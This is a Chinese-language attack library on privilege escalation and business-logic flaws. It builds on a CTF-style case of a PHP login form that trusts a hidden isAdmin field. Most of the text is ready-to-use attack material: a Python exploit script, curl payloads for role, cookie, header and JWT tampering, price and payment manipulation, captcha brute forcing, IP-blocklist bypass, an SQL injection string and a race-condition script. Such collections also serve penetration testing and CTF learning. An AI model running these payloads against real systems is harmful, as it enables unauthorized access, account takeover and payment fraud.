# 权限提升 & 业务逻辑 - 攻击库
# 权限提升-业务逻辑-攻击库
**Keywords**: Privilege Escalation, Authorization Bypass, Business Logic, Mass Assignment, Hidden Field, Role Parameter, Parameter Tampering, IDOR

## 1. 基础业务逻辑漏洞

### 常见业务逻辑缺陷

```
1. 隐藏字段篡改 (HTML hidden input)
2. 参数篡改 (URL/POST参数)
3. 认证绕过 (直接访问受保护资源)
4. 授权绕过 (越权访问)
5. 价格操纵 (修改购物价格)
6. 积分兑换逻辑 (任意兑换)
7. 支付逻辑 (金额篡改)
```

## 2. 案例052 - 隐藏字段权限提升

### 漏洞代码

```html
<form action="index.php" method="POST">
    Username: <input type="text" name="username"><br>
    Password: <input type="password" name="password"><br>
    <input type="hidden" name="isAdmin" value="false" />  <!-- 可被修改 -->
    <button type="submit">Login</button>
</form>

<?php
if (isset($_POST['isAdmin'])) {
    if ($_POST['isAdmin'] == "true") {  <!-- 直接信任用户输入 -->
        echo "Welcome Admin! Flag: " . $flag;
    }
}
?>
```

### 攻击原理

HTML中的隐藏字段（hidden input）可以被客户端任意修改，攻击者只需将`isAdmin=false`改为`isAdmin=true`即可获得管理员权限。

### 攻击方法1: 修改HTML后提交

```bash
# 在浏览器中修改HTML，将
# <input type="hidden" name="isAdmin" value="false" />
# 改为
# <input type="hidden" name="isAdmin" value="true" />
# 然后提交表单
```

### 攻击方法2: 使用curl直接发送

```bash
# 直接发送包含isAdmin=true的POST请求
curl -X POST "http://target/index.php" \
  -d "username=test&password=test&isAdmin=true"
```

### 攻击方法3: 使用Python脚本

```python
#!/usr/bin/env python3
import requests
import sys
import re

def exploit_hidden_field(target_url):
    """
    利用隐藏字段权限提升
    """
    
    print(f"[*] 目标: {target_url}")
    print("[*] 漏洞: 隐藏字段权限提升\n")
    
    # 直接发送包含isAdmin=true的请求
    post_url = target_url.rstrip('/') + "/index.php"
    
    # 构造包含isAdmin=true的表单数据
    data = {
        'username': 'admin',
        'password': 'admin',
        'isAdmin': 'true'  # 关键：将isAdmin设为true
    }
    
    print(f"[*] 发送请求，isAdmin=true...")
    
    r = requests.post(post_url, data=data)
    
    if r.status_code == 200:
        print(f"[+] 请求成功!\n")
        
        # 搜索flag
        if 'flag' in r.text.lower() or 'congratulations' in r.text.lower():
            print(f"[+] 成功获得管理员权限!\n")
            
            flag_match = re.search(r'FLAG\{[^}]*\}|flag[^<\s]*', r.text, re.IGNORECASE)
            if flag_match:
                print(f"{'='*60}")
                print(f"[+] FLAG: {flag_match.group(0)}")
                print(f"{'='*60}\n")
                return flag_match.group(0)
            else:
                print(f"[+] 响应内容:\n{r.text[:500]}\n")
                return r.text
        else:
            print("[-] 未找到flag")
            return None
    else:
        print(f"[-] 请求失败: {r.status_code}")
        return None

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"用法: {sys.argv[0]} <目标URL>")
        sys.exit(1)
    
    print("="*60)
    print("案例052 隐藏字段权限提升")
    print("="*60 + "\n")
    
    exploit_hidden_field(sys.argv[1])
```

### 使用Burp Suite拦截修改

```
1. 打开Burp Suite
2. 在Proxy标签中启用拦截
3. 在浏览器中提交登录表单
4. 在拦截的请求中将 isAdmin=false 改为 isAdmin=true
5. 点击Forward发送修改后的请求
```

### 使用浏览器开发者工具修改

```javascript
// 在浏览器控制台中执行
document.querySelector('input[name="isAdmin"]').value = 'true';
document.querySelector('form').submit();
```

## 3. 其他权限提升技巧

### 技巧1: 参数篡改

```bash
# 原始请求
GET /user/123/profile

# 攻击
GET /user/456/profile  # 访问其他用户
GET /admin/dashboard   # 直接访问管理面板
```

### 技巧2: Role/Permission参数篡改

```bash
# 修改角色参数
curl -X POST "http://target/api/user" \
  -d "username=attacker&role=admin&permission=all"

# 修改权限字段
curl -X POST "http://target/update" \
  -d "user_id=123&permissions=admin,delete_user"
```

### 技巧3: Cookie篡改

```bash
# 登录普通用户
curl "http://target/login" \
  -d "username=user&password=pass" \
  -c cookies.txt

# 修改cookie中的role字段
curl "http://target/admin" \
  -b "cookies.txt;role=admin"
```

### 技巧4: HTTP头篡改

```bash
# 修改X-User-Role头
curl -X GET "http://target/admin" \
  -H "X-User-Role: admin"

# 修改X-Admin头
curl -X POST "http://target/api/delete" \
  -H "X-Admin: true" \
  -d "user_id=123"
```

### 技巧5: Price/Amount篡改

```bash
# 原始请求（购买价格100元）
POST /buy
product_id=1&amount=100

# 攻击（修改为0或负数）
POST /buy
product_id=1&amount=0

POST /buy
product_id=1&amount=-100  # 反向消费
```

## 4. 业务逻辑绕过

### 绕过1: 支付逻辑绕过

```bash
# 正常流程：生成订单 -> 支付 -> 确认
# 绕过：直接跳过支付步骤
GET /confirm?order_id=123

# 或修改支付状态
POST /confirm
order_id=123&paid=true
```

### 绕过2: 验证码绕过

```bash
# 测试验证码逻辑
# 1. 多次尝试暴力破解
for i in {0000..9999}; do
  curl -X POST "http://target/verify" \
    -d "captcha=$i"
done

# 2. 测试验证码重用
# 同一个验证码多次使用

# 3. 跳过验证码
# 不提交验证码字段

# 4. 修改验证码
# 如果验证码存储在cookie/参数中，直接修改
```

### 绕过3: 时间相关逻辑

```bash
# 修改系统时间绕过截止日期
# 如果应用依赖客户端时间

# 重放过期的请求
curl -H "Date: [old_date]" "http://target/api"

# 利用时区差异
curl -H "X-Timezone: +12" "http://target/api"
```

### 绕过4: 黑名单绕过

```bash
# 如果应用有IP黑名单
# 使用代理或修改X-Forwarded-For头
curl -X POST "http://target/admin" \
  -H "X-Forwarded-For: 127.0.0.1"

# 如果有用户黑名单
# 使用特殊字符或编码
username=admin%00
username=admin.
username=admin+
```

## 5. 整合业务逻辑和技术漏洞

### 场景1: 业务逻辑 + IDOR

```bash
# 获取其他用户的订单
curl "http://target/api/orders/999"  # 访问不属于我的订单ID

# 修改其他用户的订单金额
curl -X POST "http://target/api/orders/999" \
  -d "amount=0"
```

### 场景2: 业务逻辑 + 认证绕过

```bash
# 直接访问受保护的管理员功能
curl "http://target/admin/users"

# 在管理员功能中修改其他用户的权限
curl -X POST "http://target/admin/promote" \
  -d "user_id=123&role=admin"
```

### 场景3: 业务逻辑 + SQL注入

```bash
# 在业务逻辑参数中注入SQL
curl -X POST "http://target/buy" \
  -d "product_id=1' OR '1'='1"
```

## 6. 高级权限提升技巧

### 技巧1: 竞态条件导致权限提升

```python
import threading
import requests

def modify_permission():
    """不断修改权限"""
    while True:
        requests.post("http://target/api/user", 
                     data={"id": "123", "role": "admin"})

def exploit():
    """不断尝试访问admin功能"""
    while True:
        r = requests.get("http://target/admin")
        if r.status_code == 200:
            print("[+] 成功!")
            break

# 并发执行
t1 = threading.Thread(target=modify_permission)
t2 = threading.Thread(target=exploit)
t1.start()
t2.start()
```

### 技巧2: JWT令牌篡改导致权限提升

```python
import jwt
import base64

# 窃取JWT token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 如果服务器没有验证签名
# 可以直接修改payload
header = jwt.get_unverified_header(token)
payload = jwt.decode(token, options={"verify_signature": False})

# 修改role字段
payload['role'] = 'admin'

# 重新编码（如果验证签名失败，尝试空签名）
new_token = jwt.encode(payload, '', algorithm='HS256')
```

### 技巧3: Insecure Direct Object Reference (IDOR) 权限提升

```bash
# 访问不属于当前用户的资源
curl "http://target/api/user/999/profile"

# 修改他人的配置
curl -X POST "http://target/api/user/999" \
  -d "role=admin&permissions=all"

# 访问其他用户的敏感数据
curl "http://target/api/user/999/documents"
```

